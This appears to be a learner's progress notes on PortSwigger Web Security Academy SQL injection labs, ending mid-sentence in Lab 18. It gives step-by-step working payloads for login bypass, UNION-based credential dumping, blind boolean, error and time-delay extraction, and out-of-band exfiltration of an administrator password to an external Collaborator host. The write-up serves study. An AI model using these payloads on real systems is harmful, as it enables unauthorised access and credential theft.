# PortSwigger Web Security Academy Progress

## Lab 1: SQL Injection — WHERE Clause Bypass (Retrieving Hidden Data)

Topic: SQL Injection | Difficulty: Apprentice

## Vulnerability
The application filters products by category using a query built like this:
SELECT * FROM products WHERE category = 'Gifts' AND released = 1
The `category` parameter is inserted directly into the SQL query without
proper sanitization, allowing an attacker to manipulate the query's logic
by injecting their own SQL syntax.

## Steps Taken
1. Used Burp Suite to intercept the HTTP request sent when selecting a
   product category
2. Modified the `category` parameter value to:
'+OR+1=1--
3. Forwarded the modified request

## How the Payload Works
- `'` closes the original string value (`'Gifts'`), ending the intended
  category filter
- `OR 1=1` adds a condition that is always true, regardless of the actual
  category — this makes the WHERE clause match every row in the table
- `--` comments out the rest of the original query (including the
  `AND released = 1` check), so the "unreleased products only" restriction
  is bypassed entirely

The resulting query effectively becomes:
SELECT * FROM products WHERE category = '' OR 1=1--' AND released = 1
Since `1=1` is always true and everything after `--` is ignored, the
database returns all products — including unreleased ones that should have
been hidden.

## Result
Successfully bypassed the category and release-status filtering, causing
the application to display unreleased products that should not have been
visible to a regular user.

## What I Learned
This lab demonstrated the core mechanic behind SQL injection: when user
input is concatenated directly into a SQL query instead of being properly
parameterized, an attacker can break out of the intended data context and
inject logic that changes the query's behavior entirely. The `OR 1=1`
pattern is one of the most fundamental SQL injection techniques and is
often the first thing tested when probing for this vulnerability class.



## Lab 2: SQL Injection — Login Bypass

Topic: SQL Injection | Difficulty: Apprentice

## Vulnerability
The login function builds a SQL query using the submitted username and
password directly, likely structured like this:
SELECT * FROM users WHERE username = 'admin' AND password = 'pass123'
Since the input is not properly sanitized, an attacker can inject SQL
syntax through the username field to alter how the query is interpreted.

## Steps Taken
1. Used Burp Suite to intercept the login request
2. Modified the `username` parameter to:
administrator'--
3. Left the password field as is (or any value), since it would no longer
be checked
4. Forwarded the request

## How the Payload Works
The single quote `'` closes the string value for the username field,
ending it right after "administrator." The double dash `--` then comments
out everything that follows in the original query, including the entire
password check. The query effectively becomes:
SELECT * FROM users WHERE username = 'administrator'--' AND password = '...'
Since everything after `--` is treated as a comment, the database only
evaluates whether a user named "administrator" exists. The password check
is completely bypassed, and the application logs the attacker in as that
user without ever verifying a correct password.

## Result
Successfully logged into the application as the administrator account
without knowing the actual password.

## What I Learned
This lab showed how SQL injection isn't limited to leaking data — it can
directly bypass authentication entirely, granting full access to a
privileged account. The technique here is closely related to the previous
lab (Lab 1): both use SQL comment syntax to cut off part of the original
query logic. This is a good example of why input validation and
parameterized queries matter everywhere user input touches a database,
not just in search/filter functions but in login systems specifically,
where the consequences of a bypass are especially severe (full account
takeover).



## Lab 3: SQL Injection — UNION Attack (Database Version, Oracle)

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same product category filter as Lab 1, vulnerable to SQL injection. This time,
instead of just bypassing a filter, the goal was to use a UNION attack to
pull additional data (the database version) directly into the visible
application output.

## Background: What is a UNION Attack?
A UNION attack combines the results of the original query with results from
an injected query, using SQL's `UNION` keyword. For this to work, two
conditions must be met:
- The injected query must return the **same number of columns** as the
  original query
- The data types of each column must be compatible between the original
  and injected query (in this case, both needed to be text)

## Steps Taken

### Step 1: Determine the number of columns
Tested the number of columns being returned by the original query, confirming
it returns exactly 2 columns.

### Step 2: Confirm both columns accept text data
Sent the following payload in the `category` parameter to verify both
columns could hold text values:
'+UNION+SELECT+'abc','def'+FROM+dual--
Note: Oracle requires every SELECT statement to specify a table using FROM —
unlike some other databases. Since this attack doesn't need to pull from a
real table, Oracle's built-in dummy table `dual` was used to satisfy this
requirement.

The response confirmed both columns rendered as text successfully.

### Step 3: Retrieve the database version
Sent the final payload:
'+UNION+SELECT+BANNER,+NULL+FROM+v$version--
`v$version` is an Oracle system view that stores database version
information, and `BANNER` is the column containing the readable version
string. `NULL` was used for the second column since only one piece of
real data (the version string) was needed, and the query still required a
matching second column.

## Result
Successfully retrieved and displayed the Oracle database version string
through the application's product listing page.

## What I Learned
This lab introduced UNION-based SQL injection, a technique that goes beyond
bypassing logic (like Labs 1 and 2) and instead directly extracts arbitrary
data from the database by appending a second query. It also highlighted an
important database-specific detail: Oracle requires a FROM clause on every
SELECT, unlike MySQL for example, which means injection payloads aren't
always portable across different database engines — attackers (and testers)
need to identify the underlying database type first to craft a working
UNION payload. Using built-in system tables/views like `dual` and `v$version`
shows how attackers can pull metadata about the environment itself, which is
often a stepping stone toward more targeted, higher-impact attacks.



## Lab 4: SQL Injection — UNION Attack (Database Version, MySQL/MSSQL)

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same product category filter injection point as previous labs, again
solvable using a UNION attack to retrieve the database version string.
This lab's target database uses different syntax conventions than the
Oracle lab before it, requiring a slightly different payload approach.

## Steps Taken

### Step 1: Confirm column count and text-compatible columns
Sent the following payload in the `category` parameter:
'+UNION+SELECT+'abc','def'#
The response confirmed the query returns exactly 2 columns, both capable
of holding text data.

### Step 2: Retrieve the database version
Sent the final payload:
'+UNION+SELECT+@@version,+NULL#
`@@version` is a built-in system variable (used in MySQL and Microsoft SQL
Server) that returns the database version string directly, without needing
to query a system table like Oracle's `v$version`. `NULL` was used for the
second column to match the required column count.

## Result
Successfully retrieved and displayed the database version string through
the application's product listing page.

## Key Difference from Previous Lab (Oracle)
| | Oracle | MySQL / MSSQL |
|---|---|---|
| Comment syntax | `--` | `#` |
| Version retrieval | `SELECT BANNER FROM v$version` | `SELECT @@version` |
| FROM requirement | Mandatory even for constant selects (`FROM dual`) | Not required — can `SELECT @@version` directly |

## What I Learned
This lab reinforced that SQL injection payloads are not universal — the
same underlying UNION attack technique needs to be adapted based on the
specific database engine being targeted. Oracle's stricter syntax (requiring
FROM on every SELECT, and pulling version info from a system view) contrasts
with MySQL/MSSQL's simpler built-in variable (`@@version`) and different
comment syntax (`#` vs `--`). In a real assessment, correctly fingerprinting
the database type early on is essential, since using the wrong syntax will
simply cause the injection to fail even if the vulnerability itself is
exploitable.



## Lab 5: SQL Injection — Full Database Enumeration & Credential Extraction

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same UNION-injectable product category filter as previous labs. This time,
the goal was to go beyond retrieving a single value (like the DB version)
and instead enumerate the entire database structure to locate and extract
real user credentials, then use them to log in as administrator.

## Steps Taken

### Step 1: Confirm column count and text compatibility
'+UNION+SELECT+'abc','def'--
Confirmed 2 columns, both text-compatible — same baseline check as before.

### Step 2: List all tables in the database
'+UNION+SELECT+table_name,+NULL+FROM+information_schema.tables--
`information_schema.tables` is a built-in system view (available on
non-Oracle databases like MySQL/PostgreSQL/MSSQL) that lists every table
in the database. This returned all table names, including one clearly
related to user accounts (e.g. `users_abcdef`).

### Step 3: List the columns within the identified table
'+UNION+SELECT+column_name,+NULL+FROM+information_schema.columns+WHERE+table_name='users_abcdef'--
`information_schema.columns` lists column names for a given table. This
revealed the specific column names holding usernames and passwords
(e.g. `username_abcdef`, `password_abcdef`).

### Step 4: Extract the actual usernames and passwords
'+UNION+SELECT+username_abcdef,+password_abcdef+FROM+users_abcdef--
This returned the full list of usernames and their corresponding
passwords directly in the application's response.

### Step 5: Log in as administrator
Located the `administrator` entry in the extracted data, retrieved the
associated password, and used it to log into the application through the
normal login form.

## Result
Successfully enumerated the database's internal structure and extracted
live credentials, then used them to log in as the administrator account.

## What I Learned
This lab combined everything from the previous UNION-based labs into a
complete, realistic attack chain: instead of guessing table/column names,
`information_schema` provides a standardized way (on non-Oracle databases)
to map out a database's entire structure from the outside — table names,
column names, and then the data itself. This is a significant escalation
from earlier labs: rather than bypassing a single check or reading one
value, this demonstrates how a single injection point can lead to full
credential exposure across an entire application, since password data was
stored and retrieved without any indication of hashing or encryption in
this exercise. In a real system, this reinforces why credentials should
never be retrievable this easily even if an injection point exists (e.g.,
proper hashing, least-privilege database accounts, and input
parameterization would all reduce the impact of a flaw like this).



## Lab 6: SQL Injection :_ Full Database Enumeration & Credential Extraction (Oracle)

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same attack goal as Lab 5 (enumerate database structure, extract
credentials, log in as administrator) but against an Oracle database,
requiring Oracle-specific system views and syntax instead of the
`information_schema` approach used on MySQL/PostgreSQL/MSSQL.

## Steps Taken

### Step 1: Confirm column count and text compatibility
'+UNION+SELECT+'abc','def'+FROM+dual--
Same as previous Oracle lab — used the `dual` dummy table since Oracle
requires a FROM clause on every SELECT statement.

### Step 2: List all tables in the database
'+UNION+SELECT+table_name,NULL+FROM+all_tables--
`all_tables` is Oracle's equivalent of `information_schema.tables` — a
built-in system view listing every table accessible to the current user.
This revealed a table clearly related to user credentials (e.g.
`USERS_ABCDEF`).

### Step 3: List the columns within the identified table
'+UNION+SELECT+column_name,NULL+FROM+all_tab_columns+WHERE+table_name='USERS_ABCDEF'--
`all_tab_columns` is Oracle's equivalent of `information_schema.columns`,
listing column names for a specified table. This revealed the username
and password column names.

### Step 4: Extract usernames and passwords
'+UNION+SELECT+USERNAME_ABCDEF,+PASSWORD_ABCDEF+FROM+USERS_ABCDEF--
Retrieved the full list of usernames and passwords directly in the
application's response.

### Step 5: Log in as administrator
Located the administrator's password in the extracted data and logged in
successfully through the normal login form.

## Result
Successfully enumerated the Oracle database's structure and extracted live
credentials, gaining administrator access.

## Comparison: Oracle vs Non-Oracle (MySQL/PostgreSQL/MSSQL) Enumeration
| Purpose | Oracle | MySQL / PostgreSQL / MSSQL |
|---|---|---|
| List tables | `all_tables` | `information_schema.tables` |
| List columns | `all_tab_columns` | `information_schema.columns` |
| Dummy table requirement | Required (`dual`) | Not required |
| Comment syntax | `--` | `--` or `#` (varies) |

## What I Learned
This lab confirmed that the *methodology* of a UNION-based enumeration
attack — list tables, list columns, extract data — stays consistent across
database engines, but the exact system views and required syntax change
significantly depending on the target database. Having now done this on
both Oracle and non-Oracle databases (Lab 5 and this lab), I can recognize
that identifying the database type early in an assessment is a critical
step, since it determines which system tables and syntax will actually
work. This mirrors real-world penetration testing, where tools like
sqlmap automate this fingerprinting step, but understanding it manually
builds a much stronger foundation than relying on tooling alone.



## Lab 7: SQL Injection :_ Determining Number of Columns (UNION Attack Setup)

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same product category filter injection point as previous labs. This lab
focused specifically on the foundational first step of any UNION attack:
figuring out exactly how many columns the original query returns, since a
UNION SELECT must match that number exactly or the database throws an error.

## Steps Taken

### Step 1: Try with a single NULL value
'+UNION+SELECT+NULL--
This caused an error, indicating the original query returns more than one
column.

### Step 2: Add a second NULL value
'+UNION+SELECT+NULL,NULL--
The error disappeared and the response returned successfully, showing the
injected row (with NULL values) had matched the query's column count.

### Step 3: Confirm the column count
Since 2 NULLs resolved the error and produced valid output, this confirmed
the original query returns exactly 2 columns.

## Why NULL is Used for This Technique
`NULL` is used instead of arbitrary text or numbers because NULL is valid
for (almost) any data type in SQL — it doesn't matter if a column expects
text, a number, or a date, NULL will satisfy the type requirement. This
means the column-count test won't fail due to a data type mismatch, only
due to an incorrect column count, isolating exactly what's being tested.

## Result
Successfully determined the query returns 2 columns by incrementally
adding NULL values until the error disappeared.

## What I Learned
This lab isolated and explained a step I had already been performing
"blindly" in earlier labs (Labs 3-6) without fully understanding why NULL
values were used as placeholders. Now I understand that this trial-and-error
approach (adding one NULL at a time until the error clears) is the standard,
reliable method for determining column count when the number of columns
isn't already known — an essential first step before attempting any UNION
attack, since getting the column count wrong causes the entire injected
query to fail regardless of how correct the rest of the payload is.



## Lab 8: SQL Injection — Finding a Column Containing Text (UNION Attack Setup)

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same product category filter injection point. This lab covered the second
foundational step of a UNION attack: after confirming the column count,
identifying *which specific column(s)* can hold text/string data — needed
because you can only extract readable text data (like table names or
credentials) through columns that accept string values.

## Steps Taken

### Step 1: Confirm column count
'+UNION+SELECT+NULL,NULL,NULL--
Confirmed the query returns 3 columns (no error, valid response returned).

### Step 2: Test each column individually for text compatibility
Replaced one NULL at a time with the random string value provided by the
lab, testing each position:
'+UNION+SELECT+'abcdef',NULL,NULL--
If this caused a database error, it meant that particular column doesn't
accept text data (e.g., it might be an integer or date type). Moved the
test string to the next position and repeated:
'+UNION+SELECT+NULL,'abcdef',NULL--
Continued until the string appeared successfully in the application's
response without triggering an error.

## Why This Step Matters
Not every column in a database table is a text/string type — some are
integers, dates, or other types that will throw a type-mismatch error if
you try to insert a string into them via UNION SELECT. Since the actual
attack goal (e.g., extracting usernames, passwords, table names) requires
placing readable text into the response, you must first identify a column
position that will actually accept and display that text without breaking
the query.

## Result
Successfully identified which column position accepted the string value,
confirming it could be used to display extracted text data (like
credentials or table/column names) in later stages of a real UNION attack.

## What I Learned
This lab isolated the second essential UNION attack setup step — after
knowing "how many columns" (Lab 7), you also need to know "which columns
can carry text." Together, these two labs form the standard reconnaissance
process before attempting any real data extraction: determine column
count → determine text-compatible columns → then inject the actual target
data (table names, column names, credentials) into that confirmed text
column, exactly as done in Labs 3 through 6.



## Lab 9: SQL Injection — UNION Attack, Retrieving Data from a Known Table

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same product category filter injection point as previous labs. Unlike Labs
5 and 6 (where the table/column names had to be discovered first via
`information_schema` or Oracle's `all_tables`/`all_tab_columns`), this lab
provided the table and column names directly (`users` table with `username`
and `password` columns), focusing purely on constructing the final
extraction payload.

## Steps Taken

### Step 1: Confirm column count and text compatibility
'+UNION+SELECT+'abc','def'--
Confirmed 2 columns, both text-compatible.

### Step 2: Extract usernames and passwords directly
'+UNION+SELECT+username,+password+FROM+users--
Since the table and column names were already known, this payload pulled
the data straight from the `users` table and displayed it in the
application's response.

### Step 3: Log in as administrator
Located the administrator's password in the extracted results and used it
to log in through the normal login form.

## Result
Successfully retrieved all usernames and passwords from the `users` table
and logged in as the administrator using the extracted credentials.

## What I Learned
This lab reinforced that the core UNION attack skeleton (confirm column
count → confirm text-compatible columns → inject the final SELECT to pull
real data) stays exactly the same whether the target table/column names are
already known or need to be discovered first via schema enumeration. Having
now done both versions (Labs 5/6 with full discovery, and this lab with
known names), I can see clearly that the discovery step is really just an
extra round of the same technique — using UNION SELECT to pull metadata
(table/column names) instead of the final target data. This consolidates
the full UNION-based SQL injection attack chain into one repeatable
methodology I can apply to any similar injection point.


## Lab 10: SQL Injection — UNION Attack, Retrieving Multiple Values in a Single Column

Topic: SQL Injection | Difficulty: Practitioner

## Vulnerability
Same product category filter injection point. Unlike Lab 9 (where both
columns accepted text, allowing username and password to go into separate
columns), this lab's query only had **one** text-compatible column — the
other column held a different data type (e.g. numeric). This required
combining both pieces of data into a single column using string
concatenation.

## Steps Taken

### Step 1: Confirm column count and identify which column accepts text
'+UNION+SELECT+NULL,'abc'--
This confirmed the query returns 2 columns, but only the second column
accepts text data — the first had to remain NULL to avoid a type error.

### Step 2: Concatenate username and password into the single text column
'+UNION+SELECT+NULL,username||'~'||password+FROM+users--
`||` is the string concatenation operator (used in Oracle/PostgreSQL-style
SQL). This combined the `username` and `password` values into one string,
separated by a `~` character, and placed the result into the only column
that could actually display text.

### Step 3: Extract and parse the credentials
The application's response showed each row as a single combined string
(e.g. `administrator~s3cr3tpass`), which could then be split on the `~`
separator to read the username and password individually.

## Why This Technique Was Needed
Since only one column accepted text, trying to place `username` and
`password` into two separate columns directly (as in Lab 9) would have
failed with a data type error. Concatenating both values into a single
string — using a clearly distinguishable separator — worked around this
column-type limitation while still making both pieces of data readable in
the output.

## Result
Successfully retrieved all usernames and passwords (combined into a single
column) and used the extracted administrator credentials to log in.

## What I Learned
This lab showed that UNION-based data extraction isn't always
straightforward when the number of usable text columns is limited — the
concatenation operator (`||`) becomes essential when multiple pieces of
data need to be exfiltrated through fewer available text columns than
data points needed. This is a realistic constraint, since many real-world
queries won't conveniently have one text column per piece of data you want
to extract, making string concatenation a core technique for adapting a
UNION attack to whatever column structure is actually available.



## Lab 11: Blind SQL Injection with Conditional Responses

Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
The application uses a `TrackingId` cookie value directly inside a SQL query
for analytics purposes. Unlike previous labs, the query's actual results
are never shown, and no error messages appear either. The only signal
available is whether a "Welcome back" message appears on the page — this
message shows up only when the injected condition evaluates to true.

## What Makes This "Blind"
In earlier labs (UNION attacks), the database's actual query results were
visible directly in the response, making data extraction straightforward.
Here, there's no visible output at all — instead, the attacker must ask
the database a series of true/false questions and infer the answer purely
from a behavioral difference (message present vs. absent). This requires
extracting data one bit/character at a time rather than all at once.

## Steps Taken

### Step 1: Confirm the injection point responds to boolean logic
Modified the `TrackingId` cookie to:
xyz' AND '1'='1
"Welcome back" appeared — confirming a true condition shows the message.
Then tested:
xyz' AND '1'='2
"Welcome back" disappeared — confirming a false condition hides it. This
established a reliable true/false signal to build the rest of the attack on.

### Step 2: Confirm the `users` table exists
xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
True result confirmed a `users` table exists in the database.

### Step 3: Confirm the `administrator` user exists
xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
True result confirmed this specific user exists.

### Step 4: Determine the password length
Sent an incrementing series of requests:
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a
xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
...continuing until the condition flipped from true to false, revealing the
exact password length (20 characters) at the point where the "greater
than" condition stopped holding.

### Step 5: Extract the password character by character using Burp Intruder
Since testing every character at every position manually would take far
too many requests, used Burp Intruder to automate it:
xyz' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='§a§
- `SUBSTRING(password,1,1)` extracts one character from a specific
  position in the password
- Payload markers (`§a§`) were placed around the test character so
  Intruder could cycle through every lowercase letter and digit at that
  position
- Configured Intruder's payload list to include `a-z` and `0-9`
- Used Intruder's "Grep - Match" setting to flag which responses contained
  "Welcome back" — the response with a match indicated the correct
  character for that position

### Step 6: Repeat for every character position
Changed the offset in `SUBSTRING(password, X, 1)` from 1 up through 20
(the confirmed password length), re-running the Intruder attack at each
position and recording the matching character each time, eventually
reconstructing the full password.

### Step 7: Log in
Used the fully reconstructed password to log in as `administrator` through
the normal login page.

## Result
Successfully extracted the administrator's full password character-by-
character using only true/false behavioral signals, with no direct data
output from the database, and used it to log in.

## What I Learned
This lab was a significant step up from the UNION-based labs (1–10) because
it required inferring data indirectly rather than reading it directly from
a response. Blind SQL injection reflects a more realistic scenario for many
real-world applications, where query results are never directly displayed
to the user. It also introduced the practical need for automation (Burp
Intruder) — while boolean testing is simple to do manually for one or two
checks, extracting a full password character-by-character across every
position and every possible character would be impractical by hand. This
lab tied together conditional logic (AND, boolean true/false), string
functions (LENGTH, SUBSTRING), and tooling (Intruder with grep-match) into
a single, realistic end-to-end attack — genuinely one of the most valuable
labs so far in building a complete understanding of SQL injection as an
attack class.



## Lab 12: Blind SQL Injection with Conditional Errors

Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
Same tracking cookie injection point as Lab 11, but this application gives
no visible behavioral difference (like a "Welcome back" message) at all —
the response looks identical regardless of whether the injected condition
is true or false. The only signal available is whether the query causes
a database error, which surfaces as a custom error message and an HTTP 500
status code.

## What Makes This Different from Lab 11
Lab 11 (conditional responses) relied on a visible content difference
("Welcome back" present/absent). This lab has no such content difference —
so the attack had to deliberately *trigger* an error under a chosen
condition, using the presence or absence of that error as the true/false
signal instead of any visible message.

## Steps Taken

### Step 1: Confirm the cookie value affects query syntax
xyz'
A single quote caused an error (broken SQL syntax). Adding a second quote:
xyz''
made the error disappear — confirming the input was being inserted
directly into a SQL query without sanitization.

### Step 2: Confirm the injection is interpreted as SQL (not some other error type)
Tried building a valid subquery:
xyz'||(SELECT '')||'
Still errored. Since Oracle requires a FROM clause on every SELECT, adjusted to:
xyz'||(SELECT '' FROM dual)||'
No error this time — confirming both that the injection is genuinely SQL,
and that the backend database is Oracle (based on needing `dual`).

### Step 3: Confirm error-based signal reliability
Queried a non-existent table:
xyz'||(SELECT '' FROM not-a-real-table)||'
This correctly produced an error, confirming the application reliably
throws errors for invalid SQL — a dependable true/false channel.

### Step 4: Confirm the `users` table exists
xyz'||(SELECT '' FROM users WHERE ROWNUM = 1)||'
No error returned, confirming the `users` table exists. `ROWNUM = 1` was
needed to prevent the subquery from returning multiple rows, which would
have broken the string concatenation.

### Step 5: Build a conditional error trigger using CASE + divide-by-zero
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM dual)||'
This intentionally causes a divide-by-zero error only when the CASE
condition is true. Testing `1=1` produced an error (condition true);
testing `1=2` produced no error (condition false) — establishing a
reliable conditional error trigger to test any true/false condition.

### Step 6: Confirm the administrator user exists
xyz'||(SELECT CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
Error occurred, confirming this specific user exists.

### Step 7: Determine password length
Sent an incrementing series:
xyz'||(SELECT CASE WHEN LENGTH(password)>1 THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
...continuing upward until the error stopped occurring, revealing the
password length (20 characters).

### Step 8: Extract the password character by character using Burp Intruder
xyz'||(SELECT CASE WHEN SUBSTR(password,1,1)='§a§' THEN TO_CHAR(1/0) ELSE '' END FROM users WHERE username='administrator')||'
- Payload markers placed around the test character
- Payload list configured with `a-z` and `0-9`
- Instead of grep-matching text (as in Lab 11), filtered Intruder results
  by **HTTP status code**: a `500` status indicated the error fired (correct
  character), while `200` meant no error (incorrect character)

### Step 9: Repeat for every character position
Changed the offset in `SUBSTR(password, X, 1)` from 1 through 20, re-running
Intruder at each position and recording the character that produced a 500
status, reconstructing the full password.

### Step 10: Log in
Used the reconstructed password to log in as `administrator`.

## Result
Successfully extracted the administrator's full password using only the
presence or absence of a database error (no visible content difference at
all), and used it to log in.

## What I Learned
This lab pushed blind SQL injection a step further than Lab 11: instead of
relying on an existing visible signal (like a welcome message), it required
deliberately engineering a conditional error using `CASE WHEN ... THEN
TO_CHAR(1/0) ELSE ''` — turning a divide-by-zero error into an intentional
true/false signal. This is a more broadly applicable technique in real-world
testing, since many applications don't have an obvious content difference
to exploit, but almost all backend databases will throw some kind of
detectable error under the right conditions. Combined with Lab 11, I now
have a solid understanding of both major blind SQLi sub-types — conditional
responses and conditional errors — which together cover the majority of
real-world blind injection scenarios.


## Lab 13: Visible Error-Based SQL Injection
Completed: [aaj ki date]
Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
Same `TrackingId` cookie injection point pattern as Labs 11 and 12, but this
application returns a verbose, detailed database error message directly in
the response — including the full SQL query text and specific database
error details. This meant data could be leaked directly through the error
message content itself, rather than just inferring true/false from whether
an error occurred.

## What Makes This Different from Labs 11 & 12
Labs 11 and 12 only revealed a true/false signal (message present/absent,
or error present/absent) — actual data still had to be extracted one
character at a time using SUBSTRING/SUBSTR and brute-forced with Intruder.
This lab's errors are verbose enough to leak the *actual value* directly
inside the error text, making extraction dramatically faster once the
right technique is found.

## Steps Taken

### Step 1: Trigger a verbose error
Appended a single quote to the cookie:
TrackingId=ogAZZfxtOKUELbuJ'
The response returned a detailed error message disclosing the full SQL
query, confirming the injection point sits inside a single-quoted string.

### Step 2: Fix the syntax to confirm valid injection
TrackingId=ogAZZfxtOKUELbuJ'--
Commenting out the rest of the query removed the error, confirming a
syntactically valid injection.

### Step 3: Build a working CAST-based condition
TrackingId=ogAZZfxtOKUELbuJ' AND CAST((SELECT 1) AS int)--
This caused a new error stating the AND condition must be a boolean
expression. Adjusted to:
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT 1) AS int)--
No error — confirming a valid boolean comparison using CAST.

### Step 4: Attempt to pull real data (hit a character limit issue)
TrackingId=ogAZZfxtOKUELbuJ' AND 1=CAST((SELECT username FROM users) AS int)--
This triggered the original syntax error again — not because the logic was
wrong, but because the cookie had a character limit, truncating the
payload and cutting off the trailing comment characters.

### Step 5: Free up space by shortening the cookie prefix
Removed the original tracking ID value entirely:
TrackingId=' AND 1=CAST((SELECT username FROM users) AS int)--
This produced a new, different database-generated error, indicating the
query now ran — but failed because the subquery returned more than one row.

### Step 6: Restrict the subquery to a single row
TrackingId=' AND 1=CAST((SELECT username FROM users LIMIT 1) AS int)--

### Step 7: Read the leaked value directly from the error message
The response's error text read:
ERROR: invalid input syntax for type integer: "administrator"
Casting a text value (a username) to an integer type is invalid — and the
resulting error message conveniently includes the exact text value it
failed to convert. This leaked the first username in the table directly
inside the error, with no need for character-by-character brute forcing.

### Step 8: Repeat the technique to leak the password
TrackingId=' AND 1=CAST((SELECT password FROM users LIMIT 1) AS int)--
The error message returned the administrator's actual password in plain
text, embedded in the CAST failure message.

### Step 9: Log in
Used the leaked password to log in as `administrator`.

## Result
Successfully leaked both a username and a password directly from verbose
database error messages, without needing to brute-force individual
characters, and logged in as administrator.

## What I Learned
This lab introduced a much more efficient blind SQLi technique: instead of
asking the database many true/false questions (Labs 11 & 12), casting an
incompatible data type (text to int) causes the database to include the
offending value directly in its error message — leaking full strings in a
single request. This is only possible when an application exposes overly
detailed/verbose error messages, which is itself a real security weakness
(proper error handling should show generic messages to users while logging
details server-side only). This also reinforced a very practical, non-obvious
constraint: input length limits (like a cookie size cap) can break an
otherwise-correct payload, requiring the injection to be restructured (e.g.
dropping the original tracking value) to fit within the available space.


## Lab 14: Blind SQL Injection with Time Delays

Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
Same class of blind SQL injection as Labs 11–13, but in this case the
application gives absolutely no visible signal at all — no content
difference, no error message. The only way to infer information is by
measuring how long the server takes to respond.

## Technique
Used a conditional time-delay payload, structured so the database only
pauses execution (e.g. using a function like `pg_sleep()` in PostgreSQL)
when an injected condition is true:
'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--
If the response took approximately 5 seconds longer than normal, the
condition was true; if it returned immediately, the condition was false.

## What I Learned
This is the most "blind" form of blind SQLi — with no visible or error-
based signal at all, response timing becomes the only usable channel.
This technique is slower and noisier in practice (network latency can
interfere with timing accuracy) but is essential to know, since some
real-world applications suppress all other feedback.



## Lab 15: Blind SQL Injection with Time Delays and Information Retrieval

Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
Extended the time-delay technique from Lab 14 into full data extraction —
using conditional time delays to retrieve the administrator's password
character by character, since no other feedback channel (visible content
or errors) was available.

## Technique
Combined the conditional delay trigger with a character-by-character
comparison, similar in structure to the boolean-based extraction in Lab 11:
'; SELECT CASE WHEN (SUBSTRING(password,1,1)='a') THEN pg_sleep(5) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--
Used Burp Intruder to automate testing each character at each position,
measuring response time for each request instead of grep-matching text or
status codes — a request that took the extra delay indicated a correct
character guess.

## What I Learned
This lab combined the timing-based signal from Lab 14 with the same
systematic character-extraction methodology used in Labs 11–13, confirming
that regardless of which feedback channel is available (content
difference, error, or timing), the underlying extraction methodology
(confirm signal → determine length → brute-force each character position)
stays consistent. Timing-based extraction is significantly slower in
practice due to the added delay per request, reinforcing why this
technique is typically a last resort when no faster signal is available.



## Lab 16: Blind SQL Injection with Out-of-Band (OAST) Interaction

Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
This application gave no in-band signal whatsoever — no content
difference, no errors, and response timing was not reliable either. The
only way to confirm the injection was working was to trigger the
database itself to make an external network request to a server under
my control.

## Technique
Used Burp Collaborator (PortSwigger's built-in OAST — out-of-band
application security testing — service) to generate a unique external
domain, then injected a payload that caused the database to perform a DNS
lookup against that domain:
'; SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
Checking the Burp Collaborator interface afterward showed an incoming DNS
interaction, confirming the injection triggered a genuine out-of-band
network call from the database server.

## What I Learned
Out-of-band techniques are used when literally no other feedback channel
exists in the response — instead of inferring information from the
application's behavior, the database is made to "phone home" to an
external listener that the attacker controls. This is a more advanced,
specialized technique typically reserved for cases where content-based,
error-based, and time-based approaches all fail, and it also demonstrates
why outbound network access from a database server can itself be a
security risk.



## Lab 17: Blind SQL Injection with Out-of-Band Data Exfiltration

Topic: SQL Injection (Blind) | Difficulty: Practitioner

## Vulnerability
Built directly on Lab 16's out-of-band channel, but this time used it to
actually exfiltrate real data (not just confirm the injection works) — by
embedding the extracted password value directly into the out-of-band DNS
request itself.

## Technique
Modified the out-of-band payload so the subdomain of the outbound request
included the actual password value, retrieved via a subquery:
'; SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://'||(SELECT password FROM users WHERE username='administrator')||'.COLLABORATOR-ID.burpcollaborator.net/"> %remote;]>'),'/l') FROM dual--
When the database attempted this outbound request, the DNS query itself
contained the password as part of the subdomain, which was visible
directly in the Burp Collaborator interaction log.

## What I Learned
This lab showed how an out-of-band channel isn't limited to just proving
a vulnerability exists (Lab 16) — it can exfiltrate entire data values in
a single request, without needing to brute-force character by character
like the earlier blind techniques. This is significantly more efficient
than time-based or boolean-based extraction when an out-of-band channel is
available, since the full value can be captured in one interaction rather
than dozens or hundreds of requests.



## Lab 18: SQL Injection with Filter Bypass via XML Encoding

Topic: SQL Injection (Filter Evasion) | Difficulty: Practitioner

## Vulnerability
This application had a web application firewall (WAF) or input filter
blocking common SQL injection keywords/characters before they reached the
database. The underlying injection point was otherwise exploitable, but
required disguising the payload to slip past the filter.

## Technique
Encoded the malicious payload using XML entity encoding before submitting
it, since the filter inspected the raw request but the backend XML parser
decoded entities before the value reached the SQL query:
' OR 1=1--
(where `&#x27;` is the XML-encoded representation of a single quote)
The filter did not recognize the encoded characters as a SQL
